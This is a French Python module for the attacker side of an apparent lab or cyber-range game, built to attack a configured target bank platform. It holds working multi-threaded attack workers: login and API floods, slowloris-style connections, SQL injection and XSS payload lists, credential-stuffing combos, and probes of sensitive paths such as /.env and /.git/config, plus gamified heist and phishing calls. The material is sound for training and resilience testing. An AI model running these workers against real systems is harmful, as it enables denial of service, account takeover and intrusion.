"""Moteur d'attaque — Resilience-Alpha (poste Attaquant).

Lance des attaques contrôlées contre la plateforme CIBLE et suit des indicateurs
côté attaquant (requêtes envoyées, erreurs reçues, temps de réponse de la cible).
Plusieurs vecteurs peuvent tourner SIMULTANÉMENT pour saturer le serveur primaire.
Strictement limité au labo de l'équipe et à la cible configurée.
"""
import os
import threading
import time
import random
import statistics
import contextvars
from collections import deque, Counter

# Identité de l'attaquant pour la requête courante (chaque navigateur envoie son pseudo
# via l'en-tête X-Player). Le contextvar est copié dans le thread d'exécution de la route
# (anyio), donc _h() le lit correctement par requête -> plusieurs attaquants en parallèle.
_player_var = contextvars.ContextVar("atk_player", default=None)


def set_current_player(name):
    _player_var.set((name or "").strip()[:32] or None)


def _player_ip(name):
    """IP synthétique STABLE et DISTINCTE par pseudo (chaque attaquant a sa propre IP
    vue par la cible -> détection/blocage par IP isolés entre attaquants)."""
    import hashlib
    d = hashlib.md5((name or "attaquant").encode("utf-8")).digest()
    return f"10.80.{d[0]}.{d[1]}"

import requests

SQLI_PAYLOADS = [
    "admin' OR '1'='1",
    "' OR 1=1--",
    "'; DROP TABLE users;--",
    "alice'--",
    "' UNION SELECT NULL,NULL--",
    "\" OR \"\"=\"",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "\"><svg/onload=alert(1)>",
    "javascript:alert(document.cookie)",
    "<body onload=alert('xss')>",
]

# Combos réalistes pour le bourrage d'identifiants (credential stuffing).
CRED_COMBOS = [
    ("admin", "admin"),
    ("alice", "password"),
    ("bob", "123456"),
    ("root", "toor"),
    ("test", "test"),
    ("user", "qwerty"),
    ("admin", "password123"),
    ("guest", "guest"),
    ("alice", "alice2024"),
    ("support", "letmein"),
]

# Chemins bidons pour générer du bruit 404 (log/routing noise).
NOTFOUND_PATHS = [
    "/wp-admin", "/.env", "/phpmyadmin", "/admin.php", "/config.json",
    "/backup.zip", "/api/v1/secret", "/.git/config", "/server-status",
    "/old/index.html", "/debug", "/shell.php",
]

# En-tête JWT bidon : charge l'API + la DB alors que la réponse reste 401.
BOGUS_AUTH_HEADER = {"Authorization": "Bearer invalid.jwt.token"}

# Description des vecteurs disponibles (pour l'UI — labels/desc en français).
VECTORS = [
    {"name": "dos_auth", "label": "Saturation /auth (bcrypt)",
     "desc": "Flood de /auth/login avec de mauvais mots de passe — le bcrypt coûteux sature l'auth."},
    {"name": "sqli", "label": "Injection SQL",
     "desc": "Payloads SQL dans /auth/login — déclenche les 403 du WAF."},
    {"name": "api_flood", "label": "Flood API (JWT bidon)",
     "desc": "GET /api/users & /api/accounts/me avec un Bearer invalide — charge l'API + la DB (401)."},
    {"name": "xss", "label": "Injection XSS",
     "desc": "Payloads XSS dans /auth/login — déclenche les 403 du WAF."},
    {"name": "cred_stuffing", "label": "Bourrage d'identifiants",
     "desc": "Combos user/mot de passe réalistes sur /auth/login (admin/admin, bob/123456…)."},
    {"name": "notfound_flood", "label": "Bruit 404 / routing",
     "desc": "GET de chemins aléatoires inexistants — génère du bruit dans les logs et le routage."},
    {"name": "slowloris", "label": "Slowloris (connexions lentes)",
     "desc": "Connexions maintenues ouvertes sur /auth/login (timeout long) — occupe les workers."},
]
VECTOR_NAMES = [v["name"] for v in VECTORS]


class AttackController:
    """Gère plusieurs vecteurs d'attaque nommés, en parallèle."""

    def __init__(self, target_url: str):
        self.target_url = target_url.rstrip("/")
        self.lock = threading.Lock()
        # Registre : name -> dict d'état par vecteur.
        self.attacks = {}
        # Échantillonnage global (req/s agrégé, erreurs, latence).
        self.history = deque(maxlen=120)
        self._last_sent = 0
        self._last_t = time.time()
        threading.Thread(target=self._sample_loop, daemon=True).start()

    # ---- helpers registre ----
    def _new_state(self, name, intensity, duration):
        return {
            "name": name,
            "running": True,
            "stop": threading.Event(),
            "threads": [],
            "intensity": intensity,
            "duration": duration,
            "started_at": time.time(),
            "sent": 0,
            "ok": 0,
            "errors": 0,     # réponses 5xx ou connexions échouées = la cible flanche
            "refused": 0,    # réponses 4xx = bloqué / refusé
            "latencies": deque(maxlen=300),
            "status_codes": Counter(),
        }

    def _any_running(self):
        return any(a["running"] for a in self.attacks.values())

    @staticmethod
    def _normalize(name):
        # Rétro-compat : l'ancien type "dos" devient "dos_auth".
        return "dos_auth" if name == "dos" else name

    # ---- état ----
    def _attack_view(self, a):
        avg_lat = round(statistics.mean(a["latencies"]) * 1000, 1) if a["latencies"] else 0.0
        elapsed = round(time.time() - a["started_at"], 1) if a["started_at"] else 0
        remaining = max(0, round(a["duration"] - elapsed, 1)) if a["running"] else 0
        return {
            "name": a["name"],
            "running": a["running"],
            "intensity": a["intensity"],
            "duration": a["duration"],
            "sent": a["sent"],
            "ok": a["ok"],
            "errors": a["errors"],
            "refused": a["refused"],
            "avg_latency_ms": avg_lat,
            "elapsed": elapsed,
            "remaining": remaining,
        }

    def status(self):
        with self.lock:
            attacks_view = {name: self._attack_view(a) for name, a in self.attacks.items()}

            # Agrégats globaux.
            sent = sum(a["sent"] for a in self.attacks.values())
            ok = sum(a["ok"] for a in self.attacks.values())
            errors = sum(a["errors"] for a in self.attacks.values())
            refused = sum(a["refused"] for a in self.attacks.values())
            all_lat = [x for a in self.attacks.values() for x in a["latencies"]]
            avg_lat = round(statistics.mean(all_lat) * 1000, 1) if all_lat else 0.0
            codes = Counter()
            for a in self.attacks.values():
                codes.update(a["status_codes"])
            running = self._any_running()
            last = self.history[-1] if self.history else {"rate": 0}
            rate = last.get("rate", 0)

            # Vecteur le plus ancien encore actif = pour la rétro-compat top-level.
            active = [a for a in self.attacks.values() if a["running"]]
            ref = min(active, key=lambda a: a["started_at"]) if active else None
            if ref is not None:
                ref_elapsed = round(time.time() - ref["started_at"], 1)
                top_duration = ref["duration"]
                top_elapsed = ref_elapsed
                top_remaining = max(0, round(ref["duration"] - ref_elapsed, 1))
            else:
                top_duration = top_elapsed = top_remaining = 0

            return {
                "running": running,
                "target": self.target_url,
                "vectors": VECTORS,
                "attacks": attacks_view,
                "totals": {
                    "sent": sent, "ok": ok, "errors": errors, "refused": refused,
                    "avg_latency_ms": avg_lat, "rate": rate,
                },
                "history": list(self.history),
                "status_codes": dict(codes),
                # ---- rétro-compat top-level (ancien code de poll / Prometheus) ----
                "sent": sent, "ok": ok, "errors": errors, "refused": refused,
                "avg_latency_ms": avg_lat,
                "duration": top_duration, "elapsed": top_elapsed, "remaining": top_remaining,
            }

    def _sample_loop(self):
        while True:
            time.sleep(1.0)
            with self.lock:
                now = time.time()
                dt = now - self._last_t
                total_sent = sum(a["sent"] for a in self.attacks.values())
                rate = (total_sent - self._last_sent) / dt if dt > 0 else 0
                self._last_sent = total_sent
                self._last_t = now
                total_errors = sum(a["errors"] for a in self.attacks.values())
                all_lat = [x for a in self.attacks.values() for x in a["latencies"]]
                lat = round(statistics.mean(all_lat) * 1000, 1) if all_lat else 0
                if self._any_running():
                    self.history.append({"t": int(now), "rate": round(rate, 1),
                                         "errors": total_errors, "latency": lat})

    # ---- contrôle ----
    def start(self, types="dos_auth", intensity=10, duration=60):
        """Démarre un ou plusieurs vecteurs. `types` = str ou liste de noms.

        Pour chaque vecteur non déjà actif, lance `intensity` threads et un
        auto-stop après `duration` s. Un vecteur déjà actif est ignoré (no-op).
        Retourne la liste des vecteurs effectivement démarrés.
        """
        if isinstance(types, str):
            types = [types]
        if not types:
            types = ["dos_auth"]

        intensity = max(1, min(100, int(intensity)))
        duration = max(5, min(600, int(duration)))
        started = []

        for raw in types:
            name = self._normalize(raw)
            if name not in VECTOR_NAMES:
                continue
            with self.lock:
                existing = self.attacks.get(name)
                if existing and existing["running"]:
                    continue  # déjà en cours → no-op
                # (ré)initialise un état propre si pas déjà actif, ne touche pas
                # l'historique global (partagé entre vecteurs).
                if not self.history:
                    self._last_sent = 0
                    self._last_t = time.time()
                state = self._new_state(name, intensity, duration)
                self.attacks[name] = state

            worker = self._worker_for(name)
            for _ in range(intensity):
                t = threading.Thread(target=worker, args=(state,), daemon=True)
                t.start()
                state["threads"].append(t)
            threading.Thread(target=self._auto_stop, args=(state,), daemon=True).start()
            started.append(name)

        return started

    def start_all(self, intensity=10, duration=60):
        """Lance TOUS les vecteurs disponibles d'un coup."""
        return self.start(list(VECTOR_NAMES), intensity, duration)

    def _auto_stop(self, state):
        end = state["started_at"] + state["duration"]
        while state["running"] and time.time() < end:
            time.sleep(0.2)
        self._stop_state(state)

    def _stop_state(self, state):
        state["stop"].set()
        with self.lock:
            state["running"] = False

    def stop(self, type=None):
        """type donné → stoppe ce vecteur ; None/vide → stoppe TOUT."""
        if type:
            name = self._normalize(type)
            with self.lock:
                state = self.attacks.get(name)
            if state:
                self._stop_state(state)
            return name
        # Tout stopper.
        with self.lock:
            states = list(self.attacks.values())
        for state in states:
            self._stop_state(state)
        return True

    def _record(self, state, code, latency, error=False):
        with self.lock:
            state["sent"] += 1
            state["latencies"].append(latency)
            if code is not None:
                state["status_codes"][str(code)] += 1
                if code >= 500:
                    state["errors"] += 1
                elif code >= 400:
                    state["refused"] += 1
                else:
                    state["ok"] += 1
            if error:
                state["errors"] += 1

    def _worker_for(self, name):
        return {
            "dos_auth": self._dos_auth_worker,
            "sqli": self._sqli_worker,
            "api_flood": self._api_flood_worker,
            "xss": self._xss_worker,
            "cred_stuffing": self._cred_stuffing_worker,
            "notfound_flood": self._notfound_worker,
            "slowloris": self._slowloris_worker,
        }[name]

    # ---- vecteurs d'attaque ----
    def _dos_auth_worker(self, state):
        # Saturation : flood de /auth/login (vérif bcrypt coûteuse => CPU/latence montent).
        url = f"{self.target_url}/auth/login"
        s = requests.Session()
        stop = state["stop"]
        while not stop.is_set():
            t0 = time.time()
            try:
                r = s.post(url, json={"username": "alice", "password": "x" + str(random.random())}, timeout=6)
                self._record(state, r.status_code, time.time() - t0)
            except Exception:
                self._record(state, None, time.time() - t0, error=True)
            time.sleep(0.005)

    def _sqli_worker(self, state):
        # Injection : payloads SQL dans /auth/login (observable dans les logs / WAF).
        url = f"{self.target_url}/auth/login"
        s = requests.Session()
        stop = state["stop"]
        while not stop.is_set():
            payload = random.choice(SQLI_PAYLOADS)
            t0 = time.time()
            try:
                r = s.post(url, json={"username": payload, "password": payload}, timeout=6)
                self._record(state, r.status_code, time.time() - t0)
            except Exception:
                self._record(state, None, time.time() - t0, error=True)
            time.sleep(0.2)

    def _api_flood_worker(self, state):
        # Flood API : GET /api/users?q=a et /api/accounts/me avec un JWT bidon.
        # Charge l'API + la DB même si la réponse est 401.
        endpoints = [
            f"{self.target_url}/api/users?q=a",
            f"{self.target_url}/api/accounts/me",
        ]
        s = requests.Session()
        stop = state["stop"]
        i = 0
        while not stop.is_set():
            url = endpoints[i % len(endpoints)]
            i += 1
            t0 = time.time()
            try:
                r = s.get(url, headers=BOGUS_AUTH_HEADER, timeout=6)
                self._record(state, r.status_code, time.time() - t0)
            except Exception:
                self._record(state, None, time.time() - t0, error=True)
            time.sleep(0.005)

    def _xss_worker(self, state):
        # Injection XSS : payloads dans /auth/login (déclenche les 403 du WAF).
        url = f"{self.target_url}/auth/login"
        s = requests.Session()
        stop = state["stop"]
        while not stop.is_set():
            payload = random.choice(XSS_PAYLOADS)
            t0 = time.time()
            try:
                r = s.post(url, json={"username": payload, "password": payload}, timeout=6)
                self._record(state, r.status_code, time.time() - t0)
            except Exception:
                self._record(state, None, time.time() - t0, error=True)
            time.sleep(0.2)

    def _cred_stuffing_worker(self, state):
        # Bourrage d'identifiants : combos user/mot de passe réalistes sur /auth/login.
        url = f"{self.target_url}/auth/login"
        s = requests.Session()
        stop = state["stop"]
        while not stop.is_set():
            user, pwd = random.choice(CRED_COMBOS)
            t0 = time.time()
            try:
                r = s.post(url, json={"username": user, "password": pwd}, timeout=6)
                self._record(state, r.status_code, time.time() - t0)
            except Exception:
                self._record(state, None, time.time() - t0, error=True)
            time.sleep(0.05)

    def _notfound_worker(self, state):
        # Bruit 404 : GET de chemins aléatoires inexistants (log/routing noise).
        s = requests.Session()
        stop = state["stop"]
        while not stop.is_set():
            path = random.choice(NOTFOUND_PATHS) + "?r=" + str(random.random())
            url = f"{self.target_url}{path}"
            t0 = time.time()
            try:
                r = s.get(url, timeout=6)
                self._record(state, r.status_code, time.time() - t0)
            except Exception:
                self._record(state, None, time.time() - t0, error=True)
            time.sleep(0.01)

    def _slowloris_worker(self, state):
        # Slowloris (approximation) : connexions maintenues ouvertes avec un
        # timeout de lecture long et un débit minimal, pour occuper les
        # connexions / threads workers de la cible.
        url = f"{self.target_url}/auth/login"
        s = requests.Session()
        stop = state["stop"]
        while not stop.is_set():
            t0 = time.time()
            try:
                # timeout = (connexion courte, lecture très longue)
                r = s.post(url, json={"username": "alice", "password": "x"}, timeout=(5, 30))
                self._record(state, r.status_code, time.time() - t0)
            except Exception:
                self._record(state, None, time.time() - t0, error=True)
            time.sleep(1.0)


# ---------------------------------------------------------------------------
# JEU DE HACKER — zone « Reconnaissance / Opération » de la console.
# Progression : reconnaissance discrète -> ASTUCES (minuteur + succès) ->
# petit vol plafonné -> si l'attaquant force, l'IA bloque (cooldown) + bascule.
# L'état de la cible (butin, blocage, cooldown) est lu en direct côté cible ;
# la progression locale (astuces, minuteur, journal) vit ici.
# ---------------------------------------------------------------------------
TIP_INTERVAL = float(os.environ.get("TIP_INTERVAL", "180"))  # minuteur d'astuce (s)

TIPS = [
    "Commence DISCRET : sonde la cible (bouton SONDER) pour cartographier les comptes clients. "
    "Les attaques bruyantes te feront repérer par l'IA.",
    "Sonde encore : repère la cible la plus intéressante et son solde approximatif. "
    "Un flood léger du vecteur « Flood API » fait aussi fuiter des noms de comptes.",
    "Vérifie si la cible possède un LIVRET d'épargne — une poche d'argent de plus à viser.",
    "Assez d'infos ! Tente un PETIT retrait (bouton VOL) sur le compte courant. "
    "Un montant modeste passe sous le radar de l'IA.",
    "Le livret est vulnérable aussi : change la source sur « épargne ». "
    "Mais chaque retrait augmente les soupçons…",
    "DOSE ! Trop de retraits, un butin trop gros ou une attaque trop forte et l'IA te repère : "
    "blocage (cooldown), bascule vers le secours et butin ANNULÉ. Joue fin.",
]


class GameController:
    def __init__(self, target_url: str, attacks: "AttackController"):
        self.target = target_url.rstrip("/")
        self.attacks = attacks
        # Identité de l'attaquant (en-tete X-Player) : permet le multi-attaquant / PvP.
        self.name = os.environ.get("ATTACKER_NAME", "attaquant")
        self.lock = threading.Lock()
        self.tips_revealed = 1                       # 1re astuce visible d'emblée
        self.next_tip_at = time.time() + TIP_INTERVAL
        self.last_target = {}
        self.log = deque(maxlen=24)
        self._was_blocked = False
        self._event("Opération initialisée — objectif : exfiltrer un peu d'argent sans te faire repérer.", "info")
        threading.Thread(target=self._bg, daemon=True).start()

    def _event(self, msg, kind="info"):
        with self.lock:
            self.log.append({"t": time.strftime("%H:%M:%S"), "msg": msg, "kind": kind})

    def _h(self):
        """En-tete d'identite attaquant (X-Player) envoye a la cible. L'identite vient
        du navigateur (chaque attaquant choisit son pseudo) via le contextvar de requete ;
        a defaut (tache de fond), on retombe sur le pseudo par defaut du conteneur."""
        name = _player_var.get() or self.name
        return {"X-Player": name, "X-Forwarded-For": _player_ip(name)}

    def _reveal_next(self):
        with self.lock:
            if self.tips_revealed < len(TIPS):
                self.tips_revealed += 1
            self.next_tip_at = time.time() + TIP_INTERVAL

    def _fetch_target(self):
        try:
            r = requests.get(f"{self.target}/api/game/state", headers=self._h(), timeout=4)
            if r.status_code == 200:
                self.last_target = r.json()
        except Exception:
            pass
        return self.last_target

    def is_blocked(self):
        return bool((self.last_target or {}).get("blocked"))

    def _detail(self, r):
        try:
            return r.json().get("detail", f"HTTP {r.status_code}")
        except Exception:
            return f"HTTP {r.status_code}"

    def recon(self):
        if self.is_blocked():
            self._event("Sonde refusée — attaquant bloqué (cooldown en cours).", "error")
            return {"blocked": True, **self.state()}
        try:
            r = requests.post(f"{self.target}/api/game/recon", headers=self._h(), timeout=6)
        except Exception as e:  # noqa: BLE001
            self._event(f"Sonde échouée : {e}", "error")
            return {"error": str(e), **self.state()}
        if r.status_code == 200:
            d = r.json()
            self.last_target = d
            self._event("🔍 Fuite obtenue : " + d.get("leaked", ""), "success")
            self._reveal_next()
            return {"ok": True, "leaked": d.get("leaked"), **self.state()}
        self._event(f"Sonde refusée : {self._detail(r)}", "error")
        return {"refused": True, "detail": self._detail(r), **self.state()}

    def set_target(self, username):
        name = (username or "").strip()
        if not name:
            return {"error": "cible vide", **self.state()}
        try:
            r = requests.post(f"{self.target}/api/game/target", json={"username": name}, headers=self._h(), timeout=6)
        except Exception as e:  # noqa: BLE001
            self._event(f"Changement de cible échoué : {e}", "error")
            return {"error": str(e), **self.state()}
        if r.status_code == 200:
            self.last_target = r.json()
            self._event(f"🎯 Nouvelle cible : {name} (reconnaissance à refaire).", "info")
            return {"ok": True, **self.state()}
        self._event(f"Cible refusée : {self._detail(r)}", "error")
        return {"refused": True, "detail": self._detail(r), **self.state()}

    def heist(self, amount=None, source="courant", livret_id=None):
        if self.is_blocked():
            self._event("Retrait refusé — attaquant bloqué (cooldown en cours).", "error")
            return {"blocked": True, **self.state()}
        try:
            r = requests.post(f"{self.target}/api/game/heist",
                              json={"amount": amount, "source": source, "livret_id": livret_id},
                              headers=self._h(), timeout=6)
        except Exception as e:  # noqa: BLE001
            self._event(f"Retrait échoué : {e}", "error")
            return {"error": str(e), **self.state()}
        if r.status_code == 200:
            d = r.json()
            self.last_target = d
            self._event(f"💰 Butin +{d.get('stolen', 0):.0f}€ ({source}) — total {d.get('loot', 0):.0f}€", "success")
            self._reveal_next()
            return {"ok": True, **d, **self.state()}
        self._event(f"Retrait refusé : {self._detail(r)}", "error")
        return {"refused": True, "detail": self._detail(r), **self.state()}

    def _get(self, path):
        try:
            r = requests.get(f"{self.target}{path}", headers=self._h(), timeout=5)
            return r.json() if r.status_code == 200 else {"error": self._detail(r)}
        except Exception as e:  # noqa: BLE001
            return {"error": str(e)}

    def suspicion(self):
        """Niveau de suspicion (heat) par acteur, vu par l'IA de la cible."""
        return self._get("/api/game/suspicion")

    def shop(self):
        """Catalogue du shop hacker (furtivite, proxy, outils)."""
        return self._get("/api/game/shop")

    def buy(self, ukey):
        try:
            r = requests.post(f"{self.target}/api/game/shop/buy", json={"ukey": ukey},
                              headers=self._h(), timeout=6)
        except Exception as e:  # noqa: BLE001
            return {"error": str(e)}
        if r.status_code == 200:
            self._event(f"🛠 Upgrade hacker acheté : {ukey}", "success")
            return r.json()
        self._event(f"Achat refusé : {self._detail(r)}", "error")
        return {"error": self._detail(r)}

    def intel_offers(self):
        """Offres d'info vendues par le banquier (insider)."""
        return self._get("/api/intel/offers")

    def buy_intel(self, offer_id):
        try:
            r = requests.post(f"{self.target}/api/intel/offers/{offer_id}/buy",
                              headers=self._h(), timeout=6)
        except Exception as e:  # noqa: BLE001
            return {"error": str(e)}
        if r.status_code == 200:
            self.last_target = r.json() if isinstance(r.json(), dict) and "victim" in r.json() else self.last_target
            self._event("🕵️ Info achetée au banquier (recon facilitée).", "success")
            return r.json()
        self._event(f"Achat d'info refusé : {self._detail(r)}", "error")
        return {"error": self._detail(r)}

    def phishing(self, title, item_value, min_bid, lure, targets):
        payload = {"title": title, "item_value": item_value, "min_bid": min_bid,
                   "lure": lure, "targets": targets or []}
        try:
            r = requests.post(f"{self.target}/api/game/phishing", json=payload,
                              headers=self._h(), timeout=6)
        except Exception as e:  # noqa: BLE001
            return {"error": str(e)}
        if r.status_code == 200:
            d = r.json()
            self._event(f"🎣 Campagne de phishing lancée ({d.get('count', 0)} cible(s)).", "success")
            return d
        self._event(f"Phishing refusé : {self._detail(r)}", "error")
        return {"error": self._detail(r)}

    def targets(self):
        """Cibles possibles : clients, la BANQUE (coffre), autres attaquants."""
        return self._get("/api/game/targets")

    def auctions(self):
        """Enchères officielles en cours — l'attaquant peut y miser son butin (PvP)."""
        return self._get("/api/auctions")

    def bid(self, auction_id, amount):
        try:
            amt = float(amount)
            r = requests.post(f"{self.target}/api/auctions/{auction_id}/bid",
                              json={"amount": amt}, headers=self._h(), timeout=6)
        except Exception as e:  # noqa: BLE001
            return {"error": str(e)}
        if r.status_code == 200:
            self._event(f"🔨 Mise de {amt:.0f}€ placée sur l'enchère #{auction_id}.", "success")
            return r.json()
        self._event(f"Enchère refusée : {self._detail(r)}", "error")
        return {"error": self._detail(r)}

    def chat_rooms(self):
        """Salons de discussion accessibles à l'attaquant (au moins le salon global)."""
        return self._get("/api/chat/rooms")

    def chat_create_room(self, name, members):
        try:
            r = requests.post(f"{self.target}/api/chat/rooms",
                              json={"name": name, "members": members or []}, headers=self._h(), timeout=6)
        except Exception as e:  # noqa: BLE001
            return {"error": str(e)}
        return r.json() if r.status_code == 200 else {"error": self._detail(r)}

    def chat_add_member(self, room_id, member):
        try:
            r = requests.post(f"{self.target}/api/chat/rooms/{room_id}/members",
                              json={"member": member}, headers=self._h(), timeout=6)
        except Exception as e:  # noqa: BLE001
            return {"error": str(e)}
        return r.json() if r.status_code == 200 else {"error": self._detail(r)}

    def chat_messages(self, room_id, after=0):
        return self._get(f"/api/chat/rooms/{room_id}/messages?after={after}")

    def chat_post(self, room_id, body):
        try:
            r = requests.post(f"{self.target}/api/chat/rooms/{room_id}/messages",
                              json={"body": body}, headers=self._h(), timeout=6)
        except Exception as e:  # noqa: BLE001
            return {"error": str(e)}
        return r.json() if r.status_code == 200 else {"error": self._detail(r)}

    def phishing_list(self):
        return self._get("/api/game/phishing")

    def phishing_close(self, campaign_id):
        try:
            r = requests.post(f"{self.target}/api/game/phishing/{campaign_id}/close",
                              headers=self._h(), timeout=8)
        except Exception as e:  # noqa: BLE001
            return {"error": str(e)}
        if r.status_code == 200:
            d = r.json()
            self.last_target = d if isinstance(d, dict) and "victim" in d else self.last_target
            self._event(f"🎣 Campagne clôturée — volé {d.get('stolen', 0):.0f}€.", "success")
            return d
        self._event(f"Clôture phishing refusée : {self._detail(r)}", "error")
        return {"error": self._detail(r)}

    def state(self):
        st = self.last_target or {}
        now = time.time()
        with self.lock:
            revealed = self.tips_revealed
            nxt = max(0, round(self.next_tip_at - now))
            log = list(self.log)
        all_done = revealed >= len(TIPS)
        recon_count = st.get("recon_count", 0)
        return {
            "me": self.name,
            "tips": TIPS[:revealed],
            "tips_revealed": revealed,
            "tips_total": len(TIPS),
            "next_tip_in": 0 if all_done else nxt,
            "all_tips": all_done,
            "tip_interval": TIP_INTERVAL,
            "log": log,
            "target": {
                "victim": st.get("victim", ""),
                "discovered": st.get("discovered", []),
                "victim_livrets": st.get("victim_livrets", []),
                "loot": st.get("loot", 0), "loot_neutralized": st.get("loot_neutralized", 0),
                "exfiltrated_total": st.get("exfiltrated_total", 0),
                "recon_count": recon_count, "heist_count": st.get("heist_count", 0),
                "intel": st.get("intel", []),
                "blocked": st.get("blocked", False),
                "cooldown_remaining": st.get("cooldown_remaining", 0),
                "block_reason": st.get("block_reason", ""),
                "heist_max": st.get("heist_max", 0), "loot_cap": st.get("loot_cap", 0),
                "loot_cap_remaining": st.get("loot_cap_remaining", 0),
                "recon_needed": st.get("recon_needed", 0),
                "ready_to_heist": recon_count >= st.get("recon_needed", 99),
                "degraded": st.get("degraded", False),
                "distraction": st.get("distraction", 0),
                "ia_weakened": st.get("ia_weakened", False),
                "distraction_min": st.get("distraction_min", 0.25),
            },
        }

    def _bg(self):
        while True:
            time.sleep(1.0)
            st = self._fetch_target()
            # Astuce au minuteur (en plus des astuces débloquées par un succès).
            with self.lock:
                due = time.time() >= self.next_tip_at and self.tips_revealed < len(TIPS)
            if due:
                self._reveal_next()
                self._event("🕑 Nouvelle astuce débloquée (minuteur).", "info")
            # Blocage par l'IA : refuse et stoppe les attaques (cooldown visible).
            blocked = bool(st.get("blocked"))
            if blocked and not self._was_blocked:
                self._was_blocked = True
                self.attacks.stop()
                self._event("⛔ REPÉRÉ ! L'IA a bloqué l'attaquant — attaques stoppées, cooldown en cours.", "error")
            elif not blocked and self._was_blocked:
                self._was_blocked = False
                self._event("✅ Cooldown terminé — tu peux reprendre (mais reste discret).", "success")
